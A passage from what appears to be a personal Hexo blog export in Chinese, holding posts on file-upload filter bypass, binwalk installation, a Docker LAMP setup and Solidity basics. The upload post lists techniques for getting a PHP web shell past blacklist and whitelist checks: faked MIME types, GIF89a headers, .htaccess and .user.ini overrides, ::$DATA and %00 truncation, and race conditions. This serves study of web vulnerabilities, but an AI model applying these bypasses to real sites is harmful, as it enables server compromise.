<p>先传一个shell，然后进行修改<br>connect-Type:image/jpeg，看看是否可以进行绕过，如果不行，在上传内容添加GIF89a<br>当然上传了还得看是否能够被解析为php，所有的上传都要考虑是否能够被解析</p>
<p><strong>方式三</strong></p>
<ul>
<li>上传一个abc.abcd，目的只是为了查看是否为白名单还是黑名单绕过。黑名单限制一般为此文件类型不允许上传，考虑双写，大小写，空格，php2,php3,php4,php5,pht,phtml,等方式</li>
<li>我们继续上传一个/htaccess文件.htaccess文件能够设置服务器的解析文件的格式，匹配到dudu就已php的格式来解析，继而上传马</li>
<li>如果说.htaccess不能上传，接下来上传一个.user.ini，继而上传一个马</li>
</ul>
<p><strong>方法四</strong></p>
<p>如果白名单限制上传</p>
<ul>
<li>考虑00截断上传</li>
<li>文件包含漏洞+图片马</li>
<li>文件包含漏洞+二次渲染+图片马</li>
</ul>
<p><strong>方法五</strong></p>
<p>上传的东西是否被服务器很快的删除或者移除，或者说上传成功，但是无法访问，就得考虑条件竞争<br>以上均不行，考虑逻辑层面的思路</p>
<h2 id="文件上传常见验证"><a href="#文件上传常见验证" class="headerlink" title="文件上传常见验证"></a>文件上传常见验证</h2><h3 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h3><p>JS类防护</p>
<h3 id="后端"><a href="#后端" class="headerlink" title="后端"></a>后端</h3><p><strong>后缀名</strong></p>
<p>黑名单：明确不允许上传的格式后缀，asp、php、jsp、aspx等。<br>白名单：明确可以上传的文件后缀。jpg、png、zip、gif等</p>
<p><strong>文件类想</strong></p>
<p>MIME信息：</p>
<p>Content-Type称之为MIME信息，通过伪造Content-Type等来进行上传</p>
<p><strong>文件头</strong></p>
<p>内容头信息</p>
<h3 id="文件上传绕过"><a href="#文件上传绕过" class="headerlink" title="文件上传绕过"></a>文件上传绕过</h3><h4 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h4><p><strong>特殊解析信息</strong></p>
<p>使用yijuhua.jpg.zip.php等多后缀，如果没有添加strrchr()、和deldot()的话可以绕过<br>deldot():删除文件名末尾的点，防止多后缀<br>strchr(string1,string2):查找字符串在另一个字符串中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符</p>
<p>如果php3、php5、phtml没有定义到黑名单中，且apache开启解析，则可以用这种格式进行绕过</p>
<p><strong>.htaccess解析</strong></p>
<p>仅存在于Apache中<br>htaccess文件时apache服务器中的一个配置文件，负责相关目录下的网页配置。通过htaccess文件，可以帮助我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</p>
<p><strong>大小写绕过</strong></p>
<p>对大小写进行强制转换，后缀修改大小写即可绕过</p>
<p><strong>空格绕过</strong></p>
<p>源码中缺少收尾去空函数，则可以通过加空格进行绕过<br>trim():去除字符串中的空格</p>
<p><strong>点绕过</strong></p>
<p>windows中1.txt和1.txt.两者是一个文件，所以就和空格绕过是一个思路</p>
<p><strong>::$DATA绕过</strong></p>
<p>利用Windows特性<br>在windows的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理，不会检测后缀名，且保持::$DATA之前的文件名，他的目的就是不检查后缀名<br>例如：”phpinfo.php::$DATA”Windows会自动去掉末尾的::$DATA变成”phpinfo.php”</p>
<p><strong>点空格点绕过</strong></p>
<p>利用的就是程序员写代码时可能只会过滤一次特殊的关键词等，所以可以通过多次输入重复的关键词或者混着输入关键词来进行绕过</p>
<p>比如：</p>
<p>一次过滤<br>a.php-&gt;a.<br>a.pphphp-&gt;a.php 将中间的php过滤掉，还有一个php<br>但是当编写的是循环过滤的话，这个就会失效<br>a.pphphp-&gt;a.只要出现php就会过滤</p>
<p><strong>双后缀名绕过</strong></p>
<p>.pphphp</p>
<h4 id="白名单绕过"><a href="#白名单绕过" class="headerlink" title="白名单绕过"></a>白名单绕过</h4><p><strong>%00截断——GET</strong></p>
<p>原理：<br>www.xxx.com/qq.jpg<br>www.xxx.com/qq.php%00.jpg=&gt;www.xxx.com/qq.php<br>%00是被服务器解码为0x00发挥了截断作用<br>0x00是十六进制表示方法，是ascii码为0的字符，在有些函数处理时，会把这个字符当做结束符<br>%00和0x00是由区别的；%00是URL中的，0x00是文件命名<br>%00需要PHP版本小于5.3.4，且打开的配置文件php-ini，将magic_quotes_gpc设置为Off</p>
<p><strong>%00截断——POST</strong></p>
<p>post不会解码%00-&gt;url编码</p>
<p>参考资料：<a href="https://www.yuque.com/samxara/swro13/tqdn5k">https://www.yuque.com/samxara/swro13/tqdn5k</a></p>
]]></content>
      <tags>
        <tag>Web漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2020/10/18/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>binwalk安装使用</title>
    <url>/2020/01/18/binwalk%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>网上也有这个安装教程，我是看完之后根据自己的安装总结一下。以备以后使用。<br>这个软件就是对图片进行分析，看是否包含有文件压缩包。<br><span id="more"></span></p>
<h4 id="1-下载"><a href="#1-下载" class="headerlink" title="1.下载"></a><strong>1.下载</strong></h4><p>github项目：<a href="https://github.com/devttys0/binwalk">安装链接</a><br>需要已经下载python，python2或python3都行。<br>下载完zip文件，下载完解压。</p>
<h4 id="2-安装"><a href="#2-安装" class="headerlink" title="2.安装"></a><strong>2.安装</strong></h4><p>打开文件夹，在目录里按<strong>Shift+右键</strong>，打开命令窗口。输入<br><strong>python setup.py install</strong><br>安装完成</p>
<h4 id="3-配置"><a href="#3-配置" class="headerlink" title="3.配置"></a><strong>3.配置</strong></h4><p>到自己到python安装目录找到Script目录，打开，因为刚刚已经安装完成，所以里面应该有叫binwalk的没有后缀的文件。根据我的经验，可以不用理他。因为按照正常方式，要是需要用binwalk，需要输入命令比较多一点，想简单一点，可以按照下面的方法。（也是根据网上的一些教程来的，感觉这个挺方便的）。</p>
<p> 新建一个文件夹（可以在python那个安装目录），并把文件夹的路径加入到系统变量path里（这样在cmd里就可以直接运行了。）<br> 在文件夹里新建一个binwalk.bat文件，内容为以下代码。（代码来自网上教程，自己操作过，莫得问题）</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line"><span class="title">@echo</span> off</span><br><span class="line">echo * suggest: you&#x27;d better <span class="keyword">to</span> input the parameters enclosed in <span class="keyword">double</span> quotes.echo * made by pcat</span><br><span class="line">python <span class="string">&quot;%~dp0\p_binwalk.py&quot;</span> <span class="variable">%1</span> <span class="variable">%2</span> <span class="variable">%3</span> <span class="variable">%4</span> <span class="variable">%5</span> <span class="variable">%6</span> <span class="variable">%7</span> <span class="variable">%8</span> <span class="variable">%9</span></span><br></pre></td></tr></table></figure>
<p>再新建一个p_binwalk.py文件<br><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">import binwalk</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    lst=sys.argv</span><br><span class="line">    <span class="keyword">if</span> len(lst)&lt;<span class="number">2</span>:</span><br><span class="line">        print(<span class="string">&quot;No files.&quot;</span>)</span><br><span class="line">        <span class="keyword">exit</span>()</span><br><span class="line">    try:</span><br><span class="line">        <span class="keyword">if</span> lst[<span class="number">1</span>][<span class="number">0</span>]==<span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">            binwalk.scan(*lst[<span class="number">2</span>:],signature=lst[<span class="number">1</span>])</span><br><span class="line">        elif lst[<span class="number">1</span>][<span class="number">0</span>]!=<span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">            binwalk.scan(*lst[<span class="number">1</span>:],signature=True)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure><br> 只要这个文件夹的路径在系统变量path里和这2个文件存在着，那么你就可以在cmd里像linux那样使用binwalk了。</p>
<h4 id="4-常用命令"><a href="#4-常用命令" class="headerlink" title="4.常用命令"></a><strong>4.常用命令</strong></h4><p> -e 分解出压缩包<br><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">binwalk</span> -e <span class="number">555</span>.gif</span><br></pre></td></tr></table></figure><br>-D或者—dd分解某种类型的文件（在windows里要用双括号括起来）<br><figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">binwalk </span>-D=<span class="keyword">jpeg </span><span class="number">555</span>.gif</span><br></pre></td></tr></table></figure><br>-M 递归分解扫描出来的文件（得跟-e或者-D配合使用）</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">binwalk</span> -eM <span class="number">555</span>.gif</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>软件安装</category>
      </categories>
      <tags>
        <tag>软件安装</tag>
      </tags>
  </entry>
  <entry>
    <title>docker搭建LAMP环境</title>
    <url>/2021/11/22/docker%E6%90%AD%E5%BB%BALAMP%E7%8E%AF%E5%A2%83/</url>
    <content><![CDATA[<p>这里使用阿里云ECS服务器Ubuntu20.04版本进行搭建</p>
<p>首先看看有哪些lamp的使用的较多，使用docker search lamp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># docker search lamp</span><br><span class="line">NAME                                    DESCRIPTION                                     STARS     OFFICIAL   AUTOMATED</span><br><span class="line">mattrayner/lamp                         A simple LAMP docker image running the prere…   285                  [OK]</span><br><span class="line">linode/lamp                             LAMP on Ubuntu 14.04.1 LTS Container            181                  </span><br><span class="line">tutum/lamp                              Out-of-the-box LAMP image (PHP+MySQL)           148                  </span><br><span class="line">fauria/lamp                             Modern, developer friendly LAMP stack. Inclu…   110                  [OK]</span><br><span class="line">greyltc/lamp                            a super secure, up-to-date and lightweight L…   103                  [OK]</span><br><span class="line">lioshi/lamp                             Docker image for LAMP under debian              14                   [OK]</span><br><span class="line">dgraziotin/lamp                                                                         11                   [OK]</span><br><span class="line">linuxconfig/lamp                        Automated build LAMP stack environment for f…   5                    [OK]</span><br><span class="line">jakubboucek/lamp-devstack-php           Prepared images for local development in LAM…   5                    </span><br><span class="line">thiagobarradas/lamp                     Use PHP (5.4, 5.5, 5.6, 7.0, 7.1, 7.2, 7.3, …   4                    </span><br><span class="line">lampson0505/ubuntu-phy                  An Ubuntu image with teamd for network inter…   3                    </span><br><span class="line">shelleyma/lampp2                        lampp from github                               3                    [OK]</span><br><span class="line">lead4good/lamp-php                      LAMP Stack PHP                                  2                    [OK]</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>这里我们使用第一个进行安装</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># docker pull mattrayner/lamp</span><br><span class="line">Using default tag: latest</span><br><span class="line">latest: Pulling from mattrayner/lamp</span><br><span class="line">35807b77a593: Pull complete </span><br><span class="line">ccfecfa17ed6: Pull complete </span><br><span class="line">499764c8dc6b: Pull complete </span><br><span class="line">c6b0ddc4cdc0: Pull complete</span><br><span class="line">...</span><br><span class="line">Digest: sha256:f7caeba589eaea7e3d20f4ae3e3bf88233e66e7df59eb5adb49161a5365f9f90</span><br><span class="line">Status: Downloaded newer image for mattrayner/lamp:latest</span><br><span class="line">docker.io/mattrayner/lamp:latest</span><br></pre></td></tr></table></figure>
<p>启用名字mylamp，以便以后可以直接使用名字重启</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># docker run --name mylamp -p 80:80 -p 3306:3306 -d mattrayner/lamp</span><br><span class="line">e9c27bbc28366f0b00018a03b0b31be2f1ac1f1355ea31796b970c312e7f17cf</span><br></pre></td></tr></table></figure>
<p>测试运行结果</p>
<p><img src="/2021/11/22/docker%E6%90%AD%E5%BB%BALAMP%E7%8E%AF%E5%A2%83/测试phpmyadmin运行结果.png" alt="photo"></p>
<p>查看dklamp中的mysql的root密码，使用命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># docker logs mylamp</span><br><span class="line">Updating for PHP 8.0</span><br><span class="line">Replacing CLI php.ini values</span><br><span class="line">Editing APACHE_RUN_GROUP environment variable</span><br><span class="line">Editing phpmyadmin config</span><br><span class="line">Setting up MySQL directories</span><br><span class="line">Allowing Apache/PHP to write to the app</span><br><span class="line">Allowing Apache/PHP to write to MySQL</span><br><span class="line">Editing MySQL config</span><br><span class="line">=&gt; An empty or uninitialized MySQL volume is detected in /var/lib/mysql</span><br><span class="line">=&gt; Installing MySQL ...</span><br><span class="line">=&gt; Done!</span><br><span class="line">=&gt; Waiting for confirmation of MySQL service startup</span><br><span class="line">=&gt; Creating MySQL admin user with random password</span><br><span class="line">ERROR 1064 (42000) at line 1: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;IDENTIFIED BY &#x27;&#x27;&#x27; at line 1</span><br><span class="line">=&gt; Done!</span><br><span class="line">========================================================================</span><br><span class="line">You can now connect to this MySQL Server with 46W9QD9oC5Co</span><br><span class="line"></span><br><span class="line">    mysql -uadmin -p46W9QD9oC5Co -h&lt;host&gt; -P&lt;port&gt;</span><br><span class="line"></span><br><span class="line">Please remember to change the above password as soon as possible!</span><br><span class="line">MySQL user &#x27;root&#x27; has no password but only allows local connections</span><br><span class="line"></span><br><span class="line">enjoy!</span><br></pre></td></tr></table></figure>
<p>查看密码为46W9QD9oC5Co，用户名为admin</p>
<h3 id="docker常用命令"><a href="#docker常用命令" class="headerlink" title="docker常用命令"></a>docker常用命令</h3><p>查看所有镜像:docker image ls<br>查看是否有容器在运行:docker ps<br>容器停止：docker stop mylamp<br>容器开始：docker start mylamp</p>
]]></content>
  </entry>
  <entry>
    <title>solidity简单语法</title>
    <url>/2020/09/08/solidity%E7%AE%80%E5%8D%95%E8%AF%AD%E6%B3%95/</url>
    <content><![CDATA[<p>1Ether = 10^3 Finney = 10^6 Szabo = 10^18 Wei</p>
<span id="more"></span>
<h2 id="fallback"><a href="#fallback" class="headerlink" title="fallback"></a>fallback</h2><ul>
<li>没有定义fallback function,在收到ether时，会触发exception并且退回ether。</li>
<li>contract想收ether必须定义fallback function，且要加上payable modifier来宣告function可以收取。</li>
</ul>
<p>代码举例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.25;</span><br><span class="line"></span><br><span class="line">contract FallbackExample&#123;</span><br><span class="line">    event LogFallback(string message);</span><br><span class="line">    event LogBalance(uint alance);</span><br><span class="line">    </span><br><span class="line">    function() public payable&#123;</span><br><span class="line">        emit LogFallback(&quot;Fallback&quot;);</span><br><span class="line">        emit LogBalance(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="address-type"><a href="#address-type" class="headerlink" title="address type"></a>address type</h2><h3 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;address&gt;.send(uint256 amount)</span><br></pre></td></tr></table></figure>
<ul>
<li>对address送出amount Wei</li>
<li>本function会forward 2300 gas 作为呼叫的 gas<ul>
<li>因为 send 将会出发address中的fallback function</li>
</ul>
</li>
<li>当send失败，将回传 false 。否则回传 true 。</li>
</ul>
<h3 id="格式-1"><a href="#格式-1" class="headerlink" title="格式"></a>格式</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;address&gt;.transfer(uint256 amount)</span><br><span class="line"></span><br><span class="line">* 对address送出 amount Wei</span><br><span class="line">* 本 function 会 forward 2300 gas 作为呼叫的 gas</span><br><span class="line">  * 因为 transfer 将会出发 address 中的 fallback function</span><br><span class="line">* 当执行失败，将 throw exception 。</span><br><span class="line"></span><br><span class="line">### Transfer V.S. Send</span><br><span class="line"></span><br><span class="line">* Transfer 保证了转移 Ether 的正确性，因为失败的实侯会让整个transaction 收到 throw 而终止</span><br><span class="line">* Send 在执行失败只会回传 false, 因此在使用 Send 时，应该每次都检查他的回传值。比如搭配 require()</span><br><span class="line"></span><br><span class="line">代码举例</span><br><span class="line"></span><br><span class="line">```sol</span><br><span class="line">pragma solidity ^0.4.25;</span><br><span class="line"></span><br><span class="line">contract Address&#123;</span><br><span class="line">    function() public payable &#123;&#125;</span><br><span class="line">    function Balance() public view returns (uint256)&#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">    function Transfer(uint256 amount) public returns (bool)&#123;</span><br><span class="line">        msg.sender.transfer(amount * 1 ether);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    function SendWithoutCheck(uint256 amount) public returns (bool)&#123;</span><br><span class="line">        msg.sender.send(amount * 1 ether);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    function SendWithCheck(uint256 amount) public returns (bool)&#123;</span><br><span class="line">        require(msg.sender.send(amount * 1 ether),&quot;Send failed&quot;);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Mapping"><a href="#Mapping" class="headerlink" title="Mapping"></a>Mapping</h2><h3 id="格式-2"><a href="#格式-2" class="headerlink" title="格式"></a>格式</h3><p>mapping (T1 =&gt; T2) var;</p>
<ul>
<li>提供 Key -&gt; Value 的资料结构</li>
<li>T1 可以是除了 mapping 以外的所有 type，因为实际存储的时候，T1 原本的数据并不会被存储下来，只会留下 keccake256(T1) 作为 index。</li>
<li>T2 可以是任何 type</li>
</ul>
<p>代码实例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.25;</span><br><span class="line"></span><br><span class="line">contract Donation &#123;</span><br><span class="line">    mapping(address =&gt; uint) public ledger;</span><br><span class="line">    mapping(address =&gt; bool) public donors;</span><br><span class="line">    address[] public donorList;</span><br><span class="line">    </span><br><span class="line">    function isDonor(address pAddr) internal view returns(bool)&#123;</span><br><span class="line">        return donors[pAddr];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function donate() public payable&#123;</span><br><span class="line">        if(msg.value &gt;= 1 ether)&#123;</span><br><span class="line">            if(!isDonor(msg.sender))&#123;</span><br><span class="line">                donors[msg.sender] = true;</span><br><span class="line">                donorList.push(msg.sender);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            ledger[msg.sender] += msg.value;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            revert(&quot;&lt; 1 ether&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="struct"><a href="#struct" class="headerlink" title="struct"></a>struct</h2><p>格式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct Name&#123;</span><br><span class="line">    T var;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>代码示例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.25;</span><br><span class="line"></span><br><span class="line">contract Class&#123;</span><br><span class="line">    struct Student&#123;</span><br><span class="line">        string name;</span><br><span class="line">        uint score;</span><br><span class="line">        bool active;</span><br><span class="line">    &#125;</span><br><span class="line">    mapping(uint =&gt; Student) students;</span><br><span class="line">    </span><br><span class="line">    modifier ActiveStudent(uint id)&#123;</span><br><span class="line">        require(students[id].active,&quot;Student is inactive&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function register(uint id,string name) public&#123;</span><br><span class="line">        students[id] = Student(&#123;name:name,score:0,active:true&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function modifyScore(uint id,uint score) public ActiveStudent(id)&#123;</span><br><span class="line">        students[id].score = score;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function getStudent(uint id) public ActiveStudent(id) view returns (string,uint)&#123;</span><br><span class="line">        return (students[id].name,students[id].score);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="实况捐赠合约实例"><a href="#实况捐赠合约实例" class="headerlink" title="实况捐赠合约实例"></a>实况捐赠合约实例</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.25;</span><br><span class="line"></span><br><span class="line">contract Donation&#123;</span><br><span class="line">    </span><br><span class="line">    struct DonorInfo&#123;</span><br><span class="line">        address[] donors;</span><br><span class="line">        mapping (address =&gt; uint) ledger;</span><br><span class="line">    &#125;</span><br><span class="line">    mapping (address =&gt; DonorInfo) DonationHistory;</span><br><span class="line">    </span><br><span class="line">    event LogDonate(address streamer,address donor, string nickname,uint value,string message);</span><br><span class="line">    </span><br><span class="line">    function donate(address _streamer,string _nickname,string _message) public payable&#123;</span><br><span class="line">        require(msg.value &gt; 0);</span><br><span class="line">        </span><br><span class="line">        _streamer.transfer(msg.value);</span><br><span class="line">        </span><br><span class="line">        if(DonationHistory[_streamer].ledger[msg.sender] == 0)</span><br><span class="line">        &#123;</span><br><span class="line">            DonationHistory[_streamer].donors.push(msg.sender);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        DonationHistory[_streamer].ledger[msg.sender] += msg.value;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        emit LogDonate(_streamer,msg.sender,_nickname,msg.value,_message);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function getDonorList() public view returns(address[])&#123;</span><br><span class="line">        return DonationHistory[msg.sender].donors;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    event LogListDonorInfo(address streamer,address user,uint value);</span><br><span class="line">    </span><br><span class="line">    function listDonorInfo() public&#123;</span><br><span class="line">        for(uint i = 0;i &lt; DonationHistory[msg.sender].donors.length;i++)&#123;</span><br><span class="line">            address user = DonationHistory[msg.sender].donors[i];</span><br><span class="line">            emit LogListDonorInfo(msg.sender,user,DonationHistory[msg.sender].ledger[user]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>代码实例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.25;</span><br><span class="line"></span><br><span class="line">contract Ownable&#123;</span><br><span class="line">    address private owner;</span><br><span class="line">    construcotr() internal &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    modifier onlyOwner()&#123;</span><br><span class="line">        require(isOwner());</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function isOwner() public view returns (bool)&#123;</span><br><span class="line">        return owner == msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Main is Ownable&#123;</span><br><span class="line">    string public name = &quot;&quot;;</span><br><span class="line">    function modifyName(string _name) public onlyOwner&#123;</span><br><span class="line">        name = _name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Interface"><a href="#Interface" class="headerlink" title="Interface"></a>Interface</h2><ul>
<li>只能定义function</li>
<li>不能继承其他contracts &amp; interfaces</li>
<li>不能定义 constructor、变数、struct、enum</li>
</ul>
<p>代码实例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.25;</span><br><span class="line"></span><br><span class="line">interface Animal &#123;</span><br><span class="line">    function run(uint speed) external returns (uint);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Cat is Animal&#123;</span><br><span class="line">    function run(uint speed) public returns (uint distance)&#123;</span><br><span class="line">        return speed * speed;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Dog is Animal&#123;</span><br><span class="line">    function run(uint speed) public returns(uint distance)&#123;</span><br><span class="line">        return speed * 10;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="library"><a href="#library" class="headerlink" title="library"></a>library</h2><p>格式：library lib{}</p>
<ul>
<li>希望能只被部署一次且在一个指定的位置，但能被多个地方所使用</li>
<li>没有state variables</li>
<li>不能继承他人，也不能被继承</li>
<li>无法接受Ether</li>
</ul>
<p>代码实例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.25;</span><br><span class="line"></span><br><span class="line">library Set&#123;</span><br><span class="line">    struct Data&#123;</span><br><span class="line">        mapping(int =&gt; bool) data;</span><br><span class="line">    &#125;</span><br><span class="line">    function Insert(Data storage d,int key) public returns (bool)&#123;</span><br><span class="line">        if(d.data[key])</span><br><span class="line">            return false;//Key exists</span><br><span class="line">        d.data[key] = true;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    function Remove(Data storage d,int key) public returns (bool)&#123;</span><br><span class="line">        if(!d.data[key])</span><br><span class="line">            return false;//Key does not exists</span><br><span class="line">        d.data[key] = false;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    function Contain(Data storage d,int key) public view returns (bool) &#123;</span><br><span class="line">        return d.data[key];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Main&#123;</span><br><span class="line">    Set.Data set;</span><br><span class="line">    function insert(int key) public returns (bool) &#123;</span><br><span class="line">        return Set.Insert(set,key);</span><br><span class="line">    &#125;</span><br><span class="line">    function remove(int key) public returns (bool) &#123;</span><br><span class="line">        return Set.Remove(set,key);</span><br><span class="line">    &#125;</span><br><span class="line">    function contain(int key) public view returns (bool) &#123;</span><br><span class="line">        return Set.Contain(set,key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="SafeMath"><a href="#SafeMath" class="headerlink" title="SafeMath"></a>SafeMath</h2><p>代码实例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.25;</span><br><span class="line"></span><br><span class="line">library SafeMath&#123;</span><br><span class="line">    function mul(uint256 a,uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">        uint256 c = a * b;</span><br><span class="line">        require( c / a == b);</span><br><span class="line">        return c;</span><br><span class="line">    &#125;</span><br><span class="line">    function div(uint256 a,uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">        require(b &gt; 0); // solidity only automatically asserts when dividing by 0</span><br><span class="line">        uint256 c = a / b;</span><br><span class="line">        return c;</span><br><span class="line">    &#125;</span><br><span class="line">    function sub(uint256 a,uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">        require(b &lt;= a); // underflow</span><br><span class="line">        uint256 c = a - b;</span><br><span class="line">        return c;</span><br><span class="line">    &#125;</span><br><span class="line">    function add(uint256 a,uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">        uint256 c = a + b;</span><br><span class="line">        require(c &gt;= a); // overflow</span><br><span class="line">        return c;</span><br><span class="line">    &#125;</span><br><span class="line">    function mod(uint256 a,uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">        require(b != 0);</span><br><span class="line">        return a % b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Main&#123;</span><br><span class="line">    function test() public pure returns (uint256)&#123;</span><br><span class="line">        uint256 a = 300;</span><br><span class="line">        uint256 b = 10;</span><br><span class="line">        return SafeMath.add(a,b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Import-amp-using"><a href="#Import-amp-using" class="headerlink" title="Import &amp; using"></a>Import &amp; using</h2><p>格式：import “a.sol”;<br>格式：using lib for type;</p>
<p>代码实例</p>
